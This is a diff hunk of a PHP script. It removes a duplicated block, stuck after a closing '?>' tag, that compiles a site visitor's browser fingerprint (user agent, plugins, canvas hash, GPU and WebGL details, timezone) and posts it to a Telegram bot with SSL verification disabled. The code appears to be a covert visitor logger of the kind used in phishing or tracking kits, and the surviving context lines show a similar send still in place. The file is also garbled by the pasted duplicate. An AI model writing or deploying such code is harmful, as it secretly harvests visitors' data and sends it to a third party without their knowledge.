@@ -173,36 +173,4 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-?>$message .= "└ Timezone: {$data['timezone']} (offset {$data['timezoneOffset']} min)\n\n";
-
-$message .= "<b>🧩 BROWSER FINGERPRINT</b>\n";
-$message .= "├ User Agent: {$data['userAgent']}\n";
-$message .= "├ Language: {$data['language']} (accepted: {$data['languages']})\n";
-$message .= "├ Cookies: {$data['cookieEnabled']}, DoNotTrack: {$data['doNotTrack']}\n";
-$message .= "├ PDF viewer: {$data['pdfViewerEnabled']}, Webdriver: {$data['webdriver']}\n";
-$message .= "├ Plugins: {$data['plugins']}\n";
-$message .= "├ Canvas hash: {$data['canvasHash']}\n";
-$message .= "├ GPU Vendor: {$data['gpuVendor']}\n";
-$message .= "├ GPU Renderer: {$data['gpuRenderer']}\n";
-$message .= "├ WebGL Version: {$data['webglVersion']}\n";
-$message .= "├ Shading Language: {$data['shadingLanguageVersion']}\n";
-$message .= "└ WebGL Params: {$data['webglParams']}\n";
-
-// 8. Send to Telegram
-$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-$params = [
-    'chat_id' => $chatId,
-    'text'    => $message,
-    'parse_mode' => 'HTML',
-    'disable_web_page_preview' => false
-];
-
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_HEADER, false);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_exec($ch);
-curl_close($ch);
 ?>
